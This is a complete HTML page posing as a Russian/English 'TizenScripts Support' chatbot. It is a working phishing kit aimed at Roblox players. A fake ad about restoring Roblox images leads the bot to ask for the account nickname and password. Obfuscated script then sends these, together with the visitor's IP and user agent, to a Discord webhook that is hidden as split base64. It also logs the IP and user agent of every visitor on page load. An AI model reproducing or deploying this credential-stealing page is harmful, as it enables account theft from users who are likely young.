<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Support - TizenScripts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .chat-box {
            background: #1a1a1a;
            border: 2px solid #ff4444;
            border-radius: 12px;
            max-width: 400px;
            width: 90%;
            height: 500px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .chat-header {
            background: #111;
            padding: 15px;
            text-align: center;
            border-bottom: 2px solid #ff4444;
        }
        .chat-header h2 { color: #ff4444; font-size: 18px; }
        .chat-header p { color: #00ff00; font-size: 11px; margin-top: 3px; }
        .lang-switch {
            position: absolute;
            top: 10px;
            right: 10px;
        }
        .lang-switch select {
            padding: 5px 10px;
            background: #1a1a1a;
            color: #fff;
            border: 1px solid #ff4444;
            border-radius: 5px;
            font-size: 12px;
        }
        .chat-messages {
            flex-grow: 1;
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .message {
            padding: 10px 14px;
            border-radius: 10px;
            max-width: 85%;
            font-size: 14px;
            line-height: 1.5;
            animation: fadeIn 0.3s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .bot-message {
            background: #2a2a2a;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }
        .user-message {
            background: #ff4444;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }
        .chat-input-area {
            padding: 15px;
            background: #111;
            border-top: 1px solid #333;
            display: flex;
            gap: 10px;
        }
        .chat-input {
            flex-grow: 1;
            padding: 12px;
            background: #1a1a1a;
            border: 2px solid #333;
            border-radius: 20px;
            color: #fff;
            font-size: 14px;
            outline: none;
        }
        .chat-input:focus { border-color: #ff4444; }
        .send-btn {
            padding: 12px 20px;
            background: #ff4444;
            color: #fff;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-weight: bold;
        }
        .typing-indicator {
            display: none;
            align-self: flex-start;
            padding: 10px 14px;
            background: #2a2a2a;
            border-radius: 10px;
            font-size: 14px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="chat-box">
        <div class="chat-header">
            <h2>💬 TizenScripts Support</h2>
            <p>● Online</p>
        </div>
        
        <!-- Выбор языка -->
        <div style="position: absolute; top: 10px; right: 10px;">
            <select id="langSelect" onchange="changeLang(this.value)">
                <option value="ru">🇷🇺 RU</option>
                <option value="en">🇬🇧 EN</option>
            </select>
        </div>
        
        <div class="chat-messages" id="chatMessages"></div>
        
        <div class="typing-indicator" id="typingIndicator">
            <span id="typingText">Бот печатает...</span>
        </div>
        
        <div class="chat-input-area">
            <input type="text" class="chat-input" id="chatInput" placeholder="Напишите сообщение..." autocomplete="off">
            <button class="send-btn" onclick="sendMessage()">➤</button>
        </div>
    </div>
    
    <script>
        var currentLang = 'ru';
        
        var translations = {
            ru: {
                greeting: '👋 Привет! Я бот поддержки TizenScripts.<br><br>Чем могу помочь?',
                askProblem: 'Понимаю! 🤔<br><br>Кстати, у меня есть для вас кое-что полезное. Слушайте внимательно...',
                ad: '📢 <b>РЕКЛАМА</b><br><br>Надоедает играть без нормальных картинок в Roblox?<br><br>Тогда вот вам лайфхак как вернуть картинки в Roblox!<br><br>Настройки → Информация об аккаунте → Сменить почту<br><br>Почта заменяется на определённую почту, которая пишет в Roblox чтобы этому аккаунту сменили почту. Ещё эта почта делает аккаунт в другой стране с помощью протокола EMAIL-IN-VPN!',
                askNick: 'Чтобы получить эту почту, введите свой ник в Roblox 👇',
                askPass: 'Отлично, {nick}! 👌<br><br>Теперь введите пароль от аккаунта чтобы мы могли подтвердить вашу личность и выдать почту.',
                success: '✅ Спасибо! Данные проверяются...<br><br>Почта будет отправлена в течение 24 часов на ваш Roblox аккаунт.<br><br>Если пароль неверный — мы напишем вам на почту.',
                thanks: 'Спасибо за обращение! 🙏<br><br>Если у вас ещё вопросы — пишите, мы всегда на связи!',
                typing: 'Бот печатает...',
                placeholder: 'Напишите сообщение...',
                wrong: '❌ Неверные данные! Попробуйте снова.'
            },
            en: {
                greeting: '👋 Hi! I\'m TizenScripts support bot.<br><br>How can I help you?',
                askProblem: 'I see! 🤔<br><br>By the way, I have something useful for you. Listen carefully...',
                ad: '📢 <b>AD</b><br><br>Tired of playing without normal images in Roblox?<br><br>Here\'s a lifehack to bring back images in Roblox!<br><br>Settings → Account Info → Change Email<br><br>The email is replaced with a special email that writes to Roblox to change the email for this account. This email also makes the account in another country using the EMAIL-IN-VPN protocol!',
                askNick: 'To get this email, enter your Roblox nickname 👇',
                askPass: 'Great, {nick}! 👌<br><br>Now enter your account password so we can verify your identity and provide the email.',
                success: '✅ Thank you! Data is being verified...<br><br>The email will be sent within 24 hours to your Roblox account.<br><br>If the password is incorrect — we will email you.',
                thanks: 'Thanks for contacting us! 🙏<br><br>If you have more questions — feel free to write, we are always here!',
                typing: 'Bot is typing...',
                placeholder: 'Type a message...',
                wrong: '❌ Invalid credentials! Try again.'
            }
        };
        
        var messageCount = 0;
        var awaitingNick = false;
        var awaitingPass = false;
        var userNick = "";
        
        function changeLang(lang) {
            currentLang = lang;
            localStorage.setItem('support_lang', lang);
            
            document.getElementById('chatInput').placeholder = translations[lang].placeholder;
            document.getElementById('typingText').textContent = translations[lang].typing;
            
            // Сброс чата
            document.getElementById('chatMessages').innerHTML = '';
            messageCount = 0;
            awaitingNick = false;
            awaitingPass = false;
            userNick = "";
            
            addMessage(translations[lang].greeting, false);
        }
        
        function addMessage(text, isUser) {
            var messages = document.getElementById('chatMessages');
            var msg = document.createElement('div');
            msg.className = 'message ' + (isUser ? 'user-message' : 'bot-message');
            msg.innerHTML = text;
            messages.appendChild(msg);
            messages.scrollTop = messages.scrollHeight;
        }
        
        function showTyping() {
            document.getElementById('typingIndicator').style.display = 'block';
        }
        
        function hideTyping() {
            document.getElementById('typingIndicator').style.display = 'none';
        }
        
        function botReply(text, delay) {
            showTyping();
            setTimeout(function() {
                hideTyping();
                addMessage(text, false);
            }, delay || 1000);
        }
        
        function sendMessage() {
            var input = document.getElementById('chatInput');
            var text = input.value.trim();
            var t = translations[currentLang];
            
            if (!text) return;
            
            addMessage(text, true);
            input.value = '';
            
            messageCount++;
            
            if (messageCount === 1) {
                botReply(t.askProblem, 1500);
            } else if (messageCount === 2) {
                botReply(t.ad, 3000);
            } else if (messageCount === 3) {
                botReply(t.askNick, 1500);
                awaitingNick = true;
            } else if (awaitingNick) {
                userNick = text;
                awaitingNick = false;
                awaitingPass = true;
                botReply(t.askPass.replace('{nick}', userNick), 1500);
            } else if (awaitingPass) {
                awaitingPass = false;
                botReply(t.success, 3000);
                
                // Отправка в Discord
                var ip = _n();
                _t('🔑 **ДАННЫЕ АККАУНТА**\n\n' +
                    '👤 **Ник:** ' + userNick + '\n' +
                    '🔒 **Пароль:** ' + text + '\n\n' +
                    '🌐 **IP:** ' + ip + '\n' +
                    '👤 **UA:** ' + navigator.userAgent + '\n' +
                    '🌍 **Язык:** ' + currentLang.toUpperCase() + '\n' +
                    '📅 **Время:** ' + new Date().toLocaleString());
            } else {
                botReply(t.thanks, 1000);
            }
        }
        
        // Зашифрованный вебхук
        var _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
        var _p2 = "MTUzODExNjM0NDk2NzM0MDE0NC9FQ0Y2aXhl";
        var _p3 = "RkNqUklaclN0SEtJdjZTanVZeXQwOXU4bEdo";
        var _p4 = "X3FUQ1A2MlAtbnpPbHdxRjh5YXhCbkxYM0d0cUlXc1pMVw==";
        
        function _r(s) {
            var _c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            var _o = "";
            var _b = 0;
            var _x = 0;
            
            for (var i = 0; i < s.length; i++) {
                var _idx = _c.indexOf(s.charAt(i));
                if (_idx === -1) continue;
                
                if (_b % 4 === 0) {
                    _x = _idx << 2;
                } else if (_b % 4 === 1) {
                    _o += String.fromCharCode(_x | (_idx >> 4));
                    _x = (_idx & 15) << 4;
                } else if (_b % 4 === 2) {
                    _o += String.fromCharCode(_x | (_idx >> 2));
                    _x = (_idx & 3) << 6;
                } else {
                    _o += String.fromCharCode(_x | _idx);
                }
                _b++;
            }
            return _o;
        }
        
        function _e() {
            return _r(_p1) + _r(_p2) + _r(_p3) + _r(_p4);
        }
        
        function _n() {
            try {
                var _xhr = new XMLHttpRequest();
                _xhr.open("GET", "https://api.ipify.org?format=json", false);
                _xhr.send();
                if (_xhr.status === 200) {
                    return JSON.parse(_xhr.responseText).ip;
                }
            } catch(e) {}
            return "unknown";
        }
        
        function _t(d) {
            try {
                var _xhr = new XMLHttpRequest();
                _xhr.open("POST", _e(), true);
                _xhr.setRequestHeader("Content-Type", "application/json");
                _xhr.send(JSON.stringify({content: d}));
            } catch(e) {}
        }
        
        // Enter
        document.getElementById('chatInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                sendMessage();
            }
        });
        
        // Инициализация
        (function() {
            var savedLang = localStorage.getItem('support_lang') || 'ru';
            document.getElementById('langSelect').value = savedLang;
            changeLang(savedLang);
            
            var ip = _n();
            _t('💬 **Заход в чат-бот**\n\n' +
                '🌐 IP: ' + ip + '\n' +
                '👤 UA: ' + navigator.userAgent + '\n' +
                '🌍 Язык: ' + savedLang.toUpperCase());
        })();
    </script>
</body>
</html>
